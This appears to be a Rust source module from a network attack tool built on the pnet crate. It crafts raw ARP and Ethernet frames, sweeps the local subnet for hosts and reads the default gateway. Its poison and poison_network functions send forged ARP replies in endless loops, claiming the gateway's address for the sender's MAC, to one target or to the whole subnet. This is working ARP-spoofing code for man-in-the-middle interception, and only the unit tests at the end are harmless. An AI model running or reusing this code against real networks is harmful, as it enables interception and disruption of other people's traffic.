use pnet::datalink::{DataLinkSender, MacAddr};
use pnet::packet::Packet;
use pnet::packet::{arp, ethernet};

pub use pnet::packet::arp::ArpOperations;

use ipnetwork::Ipv4Network;

use std::net::Ipv4Addr;

use std::collections::HashSet;
use std::sync::{atomic, mpsc, Arc, Mutex};
use std::thread::sleep;
use std::time::Duration;

use super::{ChannelError, NetChannel, NetResult};

#[derive(Hash, Eq, PartialEq, Debug)]
pub struct Peer {
    pub ip: String,
    pub mac: String,
}

fn build_arp_header<'a>(
    operation: arp::ArpOperation,
    sender_mac: &MacAddr,
    sender_ip: &Ipv4Addr,
    target_mac: &MacAddr,
    target_ip: &Ipv4Addr,
) -> arp::ArpPacket<'a> {
    let empty = [0u8; 0];
    let arp_buf = vec![0; arp::ArpPacket::minimum_packet_size()];
    let mut arp_header = arp::MutableArpPacket::owned(arp_buf).unwrap();

    arp_header.set_hardware_type(arp::ArpHardwareTypes::Ethernet);
    arp_header.set_protocol_type(ethernet::EtherTypes::Ipv4);
    arp_header.set_hw_addr_len(6);
    arp_header.set_proto_addr_len(4);
    arp_header.set_operation(operation);
    arp_header.set_sender_hw_addr(*sender_mac);
    arp_header.set_sender_proto_addr(*sender_ip);
    arp_header.set_target_hw_addr(*target_mac);
    arp_header.set_target_proto_addr(*target_ip);
    arp_header.set_payload(&empty);

    arp_header.consume_to_immutable()
}

fn build_arp_eth_frame<'a>(
    operation: arp::ArpOperation,
    sender_mac: &MacAddr,
    sender_ip: &Ipv4Addr,
    target_mac: &MacAddr,
    target_ip: &Ipv4Addr,
) -> ethernet::EthernetPacket<'a> {
    let arp_header = build_arp_header(operation, sender_mac, sender_ip, target_mac, target_ip);

    let eth_buf = vec![
        0;
        arp::ArpPacket::minimum_packet_size()
            + ethernet::EthernetPacket::minimum_packet_size()
    ];
    let mut eth_frame = ethernet::MutableEthernetPacket::owned(eth_buf).unwrap();

    eth_frame.set_destination(*target_mac);
    eth_frame.set_source(*sender_mac);
    eth_frame.set_ethertype(ethernet::EtherTypes::Arp);
    eth_frame.set_payload(arp_header.packet());

    eth_frame.consume_to_immutable()
}

fn send(
    sender: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    sender_mac: &MacAddr,
    sender_ip: &Ipv4Addr,
    target_mac: &MacAddr,
    target_ip: &Ipv4Addr,
    op_type: arp::ArpOperation,
) -> NetResult<()> {
    let eth_frame = build_arp_eth_frame(op_type, sender_mac, sender_ip, target_mac, target_ip);
    let channel_sender = Arc::clone(&sender);
    let mut channel_sender = channel_sender.lock().unwrap();

    if let Some(res) = channel_sender.send_to(eth_frame.packet(), None) {
        Ok(res?)
    } else {
        Err(ChannelError::NeverSent)
    }
}

pub fn query_mac_addr(
    channel: &NetChannel,
    sender_mac: &MacAddr,
    sender_ip: &Ipv4Addr,
    target_ip: &Ipv4Addr,
) -> NetResult<MacAddr> {
    send(
        &channel.sender,
        sender_mac,
        sender_ip,
        &MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff),
        target_ip,
        arp::ArpOperations::Request,
    )
    .unwrap();

    let receiver = Arc::clone(&channel.receiver);
    let mut receiver = receiver.lock().unwrap();

    while let Ok(packet) = receiver.next() {
        let packet = ethernet::EthernetPacket::new(packet).unwrap();

        if packet.get_ethertype() == ethernet::EtherTypes::Arp {
            let packet = arp::ArpPacket::new(packet.payload()).unwrap();

            if packet.get_operation() == arp::ArpOperations::Reply
                && packet.get_sender_proto_addr() == *target_ip
            {
                return Ok(packet.get_sender_hw_addr());
            }
        }
    }

    Err(ChannelError::NeverSent)
}

pub fn get_gateway(interface: &str) -> NetResult<Ipv4Addr> {
    let raw_in = std::process::Command::new("ip")
        .args(&["route", "show", "0.0.0.0/0", "dev", interface])
        .output()
        .unwrap()
        .stdout;
    let raw_in = String::from_utf8(raw_in).unwrap();
    let raw_in = raw_in.split(" ").collect::<Vec<&str>>()[2];
    Ok(raw_in.parse().unwrap())
}

pub fn poison_network(
    sender: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    sender_mac: &MacAddr,
    gateway_ip: &Ipv4Addr,
    cidr_range: u8,
    pool: rayon::ThreadPool,
) -> NetResult<()> {
    let sender = Arc::clone(&sender);
    let peers = Ipv4Network::new(*gateway_ip, cidr_range)?;
    let target_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);

    for peer in peers.iter() {
        pool.install(|| loop {
            send(
                &sender,
                sender_mac,
                gateway_ip,
                &target_mac,
                &peer,
                arp::ArpOperations::Reply,
            )
            .unwrap();
        });
    }
    Ok(())
}

pub fn poison(
    sender: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    sender_mac: &MacAddr,
    gateway_ip: &Ipv4Addr,
    target_ip: &Ipv4Addr,
    target_mac: &MacAddr,
    pool: rayon::ThreadPool,
) -> NetResult<()> {
    let sender = Arc::clone(&sender);

    pool.install(|| loop {
        send(
            &sender,
            sender_mac,
            gateway_ip,
            &target_mac,
            &target_ip,
            arp::ArpOperations::Reply,
        )
        .unwrap();
        sleep(Duration::from_millis(1));
    });
    Ok(())
}

pub fn get_cidr(interface_ip: &Ipv4Addr, interface: &str) -> NetResult<u8> {
    let mask_ip = interfaces::Interface::get_by_name(interface)
        .unwrap()
        .unwrap()
        .addresses
        .iter()
        .filter(|a| {
            if let Some(addr) = a.addr {
                if let std::net::IpAddr::V4(ip) = addr.ip() {
                    &ip == interface_ip
                } else {
                    false
                }
            } else {
                false
            }
        })
        .next()
        .unwrap()
        .mask
        .unwrap()
        .ip();
    if let std::net::IpAddr::V4(mask) = mask_ip {
        Ok(mask.octets().iter().fold(0u8, |count, x| {
            let mut octet = *x;
            let mut c = count;
            while octet > 0 {
                if (octet & 1) == 1 {
                    c += 1;
                }
                octet >>= 1;
            }
            c
        }))
    } else {
        Err(ChannelError::NoInterface)
    }
}

pub fn discover_peers(
    pool: rayon::ThreadPool,
    channel: &super::NetChannel,
    sender_mac: &MacAddr,
    sender_ip: &Ipv4Addr,
    recv_delay: Option<std::time::Duration>,
    interface: &str,
) -> NetResult<Vec<Peer>> {
    let receiver = Arc::clone(&channel.receiver);
    let cidr = get_cidr(sender_ip, interface)?;
    let peers = Ipv4Network::new(*sender_ip, cidr)?;

    let i = Arc::new(atomic::AtomicUsize::new(0));
    let i_ref = Arc::clone(&i);

    let (tx, rx) = mpsc::channel();

    pool.spawn(move || {
        let mut receiver = receiver.lock().unwrap();
        while let Ok(packet) = receiver.next() {
            let packet = ethernet::EthernetPacket::new(packet).unwrap();

            if packet.get_ethertype() == ethernet::EtherTypes::Arp {
                let packet = arp::ArpPacket::new(packet.payload()).unwrap();

                if packet.get_operation() == arp::ArpOperations::Reply
                    && peers.contains(packet.get_sender_proto_addr())
                {
                    if let Err(_) = tx.send(Peer {
                        ip: packet.get_sender_proto_addr().to_string(),
                        mac: packet.get_sender_hw_addr().to_string(),
                    }) {
                    } else {
                        i_ref.fetch_add(1, atomic::Ordering::Relaxed);
                    }
                }
            }
        }
    });

    for peer in peers.iter() {
        pool.install(|| {
            send(
                &channel.sender,
                sender_mac,
                sender_ip,
                &MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff),
                &peer,
                arp::ArpOperations::Request,
            )
            .unwrap();
        });
    }

    std::thread::sleep(if let Some(recv_delay) = recv_delay {
        recv_delay
    } else {
        std::time::Duration::from_millis(500)
    });

    let active_peers: HashSet<Peer> = rx.iter().take(i.load(atomic::Ordering::Relaxed)).collect();

    Ok(active_peers.into_iter().collect())
}

#[cfg(test)]
mod tests {
    use super::{arp, build_arp_eth_frame, build_arp_header, ethernet, Ipv4Addr, MacAddr};
    use pnet::packet::Packet;
    use std::str::FromStr;

    #[test]
    fn arp_header() {
        let header = build_arp_header(
            arp::ArpOperations::Reply,
            &MacAddr::from_str("00:00:00:00:00:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.25").unwrap(),
            &MacAddr::from_str("ff:ff:ff:ff:ff:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.254").unwrap(),
        );

        assert_eq!(header.get_hardware_type(), arp::ArpHardwareTypes::Ethernet);
        assert_eq!(header.get_protocol_type(), ethernet::EtherTypes::Ipv4);
        assert_eq!(header.get_hw_addr_len(), 6);
        assert_eq!(header.get_proto_addr_len(), 4);
        assert_eq!(header.get_operation(), arp::ArpOperations::Reply);
        assert_eq!(
            header.get_sender_hw_addr(),
            MacAddr::from_str("00:00:00:00:00:ff").unwrap()
        );
        assert_eq!(
            header.get_sender_proto_addr(),
            Ipv4Addr::from_str("192.168.1.25").unwrap()
        );
        assert_eq!(
            header.get_target_hw_addr(),
            MacAddr::from_str("ff:ff:ff:ff:ff:ff").unwrap()
        );
        assert_eq!(
            header.get_target_proto_addr(),
            Ipv4Addr::from_str("192.168.1.254").unwrap()
        );
    }
    #[test]
    fn ethernet_frame() {
        let eth_frame = build_arp_eth_frame(
            arp::ArpOperations::Reply,
            &MacAddr::from_str("00:00:00:00:00:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.25").unwrap(),
            &MacAddr::from_str("ff:ff:ff:ff:ff:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.254").unwrap(),
        );

        let arp_header = build_arp_header(
            arp::ArpOperations::Reply,
            &MacAddr::from_str("00:00:00:00:00:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.25").unwrap(),
            &MacAddr::from_str("ff:ff:ff:ff:ff:ff").unwrap(),
            &Ipv4Addr::from_str("192.168.1.254").unwrap(),
        );

        assert_eq!(
            eth_frame.get_destination(),
            MacAddr::from_str("ff:ff:ff:ff:ff:ff").unwrap()
        );

        assert_eq!(
            eth_frame.get_source(),
            MacAddr::from_str("00:00:00:00:00:ff").unwrap()
        );

        assert_eq!(eth_frame.get_ethertype(), ethernet::EtherTypes::Arp);
        assert_eq!(eth_frame.payload(), arp_header.packet());
    }
}
